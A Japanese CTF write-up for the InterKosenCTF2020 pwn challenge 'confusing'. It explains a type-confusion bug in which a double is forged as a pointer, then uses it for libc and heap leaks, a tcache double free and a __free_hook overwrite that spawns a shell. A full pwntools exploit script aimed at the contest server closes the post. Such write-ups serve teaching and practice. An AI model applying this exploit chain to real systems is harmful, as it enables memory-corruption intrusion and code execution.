---
layout: page
title: "[writeup] InterKosenCTF2020 / confusing"
date: 2020-09-07 00:00:00 -0000
---

本問題は[公式](https://ptr-yudai.hatenablog.com/entry/2020/09/07/020405#confusing)で丁寧な解答が出ていますが、他は特に無さそうなので、せっかくなので書いてみます。

---

ソースとヘッダファイル、バイナリが配布されます。  
libcは2.27、no pie、Partial RELROです。ここだけ見ると簡単そうに見えます。

ヘッダファイルの最初を見ると、個人的には見覚えのある表が書いてあります。

```
  * >     Pointer {  0000:PPPP:PPPP:PPPP
  * >              / 0001:****:****:****
  * >     Double  {         ...
  * >              \ FFFE:****:****:****
  * >     Integer {  FFFF:0000:IIII:IIII
```

WebKit内で変数の持ち方構造を解説しているコメントです。（本題とは関係ないですがWebKitについては[これ](https://liveoverflow.com/setup-and-debug-javascriptcore-webkit-browser-0x01/)とか[これ](http://www.phrack.org/papers/attacking_javascript_engines.html)に詳しい内容があります。私はブラウザようわからんマンなので絶賛取り組み中です。）

WebKitのソースの一部を利用して、1問作っていることが分かります。かなり手の込んだ仕上がりです。すごい。（元ネタのそれっぽさを維持しながらとっつきやすくして、かつしょうもない解法の穴を防ぐの、難しいですよね？）

ソースファイルを一通り＋gdbで適当に変数を作って遊んでいると、以下のように動いているのが分かります。
- `Set value`はString、Double、Integerから選ぶことができます。このうちStringだけはmallocで確保したメモリに内容を入れます。
- `Set value`で入力した内容は`list`で保持されます。リストは0x6020a0から10個置かれ、先頭のインデックスは0になります。
- `Show list`は`list`の形から判断してタイプを識別し、内容を表示します。
- `Delete vale`は普通に消去します。この動作は正しく実装されているように見えます。

さて、このあたりでよくあるheap問のようにポインタ操作が荒かったり、インデックスが乱れたり、入力が漏れたりしそうにないことがわかってきます。

WebKitではDoubleがキーになります。この問題でも、ポインタ操作をするStringが無罪っぽい以上は、次に臭いのはDoubleです。Doubleまわりを注意深く読みます。

まずtype.hで、それぞれのタイプの判定方法について見ていきます。

```c
int Value_IsString(Value v) {
  return (v.data.magic == MAGIC_STRING) && (!Value_IsUndefined(v));
}
int Value_IsInteger(Value v) {
  return v.data.magic == MAGIC_INTEGER;
}
int Value_IsDouble(Value v) {
  return !(Value_IsUndefined(v) || Value_IsString(v) || Value_IsInteger(v));
} 
 ```

`Value_IsString`では、magicが`0000`であればそれをポインタとして扱う、とあります。
magicとは、type.hの最初の方にある以下の構造体です。

```c
typedef union __attribute__((packed)) {
  char *String;
  double Double;
  int Integer;
  struct __attribute__((packed)) {
    unsigned long  data : 48;
    unsigned short magic: 16;
  } data;
} Value;
```

すべてのValueのうち、0から5バイト目まではdata、6と7でmagicと定義されています。ここは実際にgdbで確認すればよく、以下のような操作で確認することができます。

```
1. Set value
2. Show list
3. Delete value
> 1
index: 1
type (1=String / 2=Double / 3=Integer): 1
data: AAAA
[+] Successfully set value
1. Set value
2. Show list
3. Delete value
> 1
index: 2
type (1=String / 2=Double / 3=Integer): 2
data: 1.1
[+] Successfully set value
1. Set value
2. Show list
3. Delete value
> 1
index: 3
type (1=String / 2=Double / 3=Integer): 3
data: 4444
[+] Successfully set value
1. Set value
2. Show list
3. Delete value
> ^C

(snip)

gef➤  x/20gx 0x6020a0
0x6020a0 <list>:	0x000000000000000a	0x00000000006032a0
0x6020b0 <list+16>:	0x3ff199999999999a	0xffff00000000115c
0x6020c0 <list+32>:	0x000000000000000a	0x000000000000000a
0x6020d0 <list+48>:	0x000000000000000a	0x000000000000000a
0x6020e0 <list+64>:	0x000000000000000a	0x000000000000000a
0x6020f0:	0x0000000000000000	0x0000000000000000
0x602100:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
gef➤  
```

上記で、list[0](@0x6020a0)がundefined、list[1](@0x6020a8)がStringでヒープアドレス、list[2](@0x6020b0)がDoubleでlist[3](@0x6020b8)がIntegerですね。Stringのmagicである`0000`と、Integerのmagicである`ffff`が確認できます。

先のtype.hのコードの説明に戻ります。

`Value_IsInteger`でも同様にmagic`ffff`を確認して、これがあれば整数としています。

最後に`Value_IsDouble`ですが、上記のどれでもなかった場合というのが条件になっています。magicがありません。明らかにルーズですね。
もしmagicの領域を自由に操作できると、Doubleはどのタイプにでもなれそうです。Setシリーズはどうなっているでしょうか。

```c
void Value_SetString(Value *v, char *p) {
  v->String = p;
}
void Value_SetDouble(Value *v, double d) {
  v->Double = d;
}
void Value_SetInteger(Value *v, int i) {
  v->Integer = i;
  v->data.magic = MAGIC_INTEGER;
}
```

SetString → ポインタを置くだけです。MAGICは入力せずとも達成できそうです。良いでしょう。
SetInteger → 整数を入れますがポインタと思われては困るため、MAGICを入れています。オールFがmagic2バイトに入ります。これも良いでしょう。

だがSetDouble、てめえはだめだ。この人はMAGICの入力をサボるだけでなく、そのままDoubleの値を入れてしまいます。つまり、ポインタと思われてしまうようなDoubleの値を入れても、それを防ぐことができません。つまり実際にはmallocで取っていないアドレスのフリをすることができます。具体的に試してみましょう。

```
$ python
>>> from pwn import *
>>> import struct
>>> struct.unpack('d', p64(0xc0bebeeffeedbeef))[0]
-7870.937483653178
>>> 
```

これを入力すると、以下のように任意の値を入れられることがわかります。  

```
1. Set value
2. Show list
3. Delete value
> 1
index: 1
type (1=String / 2=Double / 3=Integer): 2
data: -7870.937483653178
[+] Successfully set value
1. Set value
2. Show list
3. Delete value
> ^C

(snip)

gef➤  x/20gx 0x6020a0
0x6020a0 <list>:	0x000000000000000a	0xc0bebeeffeedbeef
0x6020b0 <list+16>:	0x000000000000000a	0x000000000000000a
0x6020c0 <list+32>:	0x000000000000000a	0x000000000000000a
0x6020d0 <list+48>:	0x000000000000000a	0x000000000000000a
0x6020e0 <list+64>:	0x000000000000000a	0x000000000000000a
0x6020f0:	0x0000000000000000	0x0000000000000000
0x602100:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
gef➤  
```

神戸ビーフがちゃんと入っています。これで任意のアドレスをlistに登録することができました。
これを利用して、以下の手順で解いていきます。

1. `Set value (Double)`で偽のポインタをGOTに向けます。
2. `Show list`でlibcアドレスをリークします。
3. `Set value (String)`で、heapのチャンクを適当に確保します。 
4. `Set value (Dobule)`で偽のポインタを、今度は2.で取ったチャンクに向けます。例えば3.ではlist[1]でポインタを持ったのであれば、0x6020a8に向ければ良いです。これで`Show list`することでheapアドレスもリークします。
5. `Set value (Double)`で偽のポインタを、3.でリークできたアドレスと同じ値に向けます。これで同じチャンクに２つのポインタが向きます。
6. 3.と5.で作ったポインタ（5.は本当はDouble）を`Delete value`でfreeします。これで任意アドレス確保ができるようになります。（この辺りが不明であれば、tcache dupなどで調べると少し理解が進むかもしれません。ここでは説明を省略します。）
7. 一度目の`Set value (String)`で`__free_hook`を狙います。（Partial RELROなのでGOTを狙ってもいいです。私は特にこだわりがなかったのでコントロールしやすそうなのを選びました。）
8. 2度めの`Set value (String)`によって、次の確保先が`__free_hook`にセットされます。
9. 普通に`Set value (String)`で`/bin/sh`をセットして`Delete value`すれば終わると思いきや、SEGVします。少し調べてみると、以下のメニューの数字を入力するところでmalloc→freeが走っているようです。

```c
int menu(void) {
  puts("1. Set value");
  puts("2. Show list");
  puts("3. Delete value");
  return get_integer("> ");
}

~~~

int get_integer(const char *msg) {
  char *p = get_string(msg);
  int v = atoi(p);
  free(p);
  return v;
}
```

というわけで、最後はメニューで`1`を送る代わりに、`/bin/sh`を送ってやれば良いでしょう。同時に`__free_hook`へ`system`を入れたいため、`__free_hook-8`をallocして、`/bin/sh\x00+p64(system)`を投げてやって終わりです。

```python
from pwn import *
import struct
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'pwn.kosenctf.com'
PORT = 9005

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(idx, t, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(t))

    if t == 1:
        r.sendlineafter(': ', data)
    else:
        r.sendlineafter(': ', str(data))

def show():
    r.sendlineafter('> ', '2')

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

r = start()
if args.D:
    debug(r, [])

bss = 0x6020a0
alloc(0, 2, struct.unpack('d', p64(elf.got.puts))[0])
show()
r.recvuntil('string] "')
leak = u64(r.recvuntil('"')[:-1].ljust(8, '\x00'))
dbg('leak')
base = leak - 0x80a30
dbg('base')

fh = base + 0x3ed8e8
system = base + 0x4f4e0

alloc(1, 1, 'hoge')
alloc(2, 2, struct.unpack('d', p64(bss+8))[0])
show()
r.recvuntil('string] "')
r.recvuntil('string] "')
r.recvuntil('string] "')
leak = u64(r.recvuntil('"')[:-1].ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x260
dbg('heap')

alloc(4, 2, struct.unpack('d', p64(heap+0x260))[0])

delete(1)
delete(4)

alloc(5, 1, p64(fh-8))
alloc(6, 1, 'hoge')

r.sendlineafter('> ', '/bin/sh\x00' + p64(system))

r.interactive()
r.close()
```

タイミングよく問題が投下された瞬間に画面を見られたので、FSOP問に続けて２つFirst Bloodを頂いてしまいました。Discordではメダルがもらえて謎にはしゃいでいましたが、順位はどんどん落ちて行きました。webとcryptoができないやつは単体火力になれないということ。きれいなwriteupがたくさん公開されているので、ちゃんと復習しようと思います。
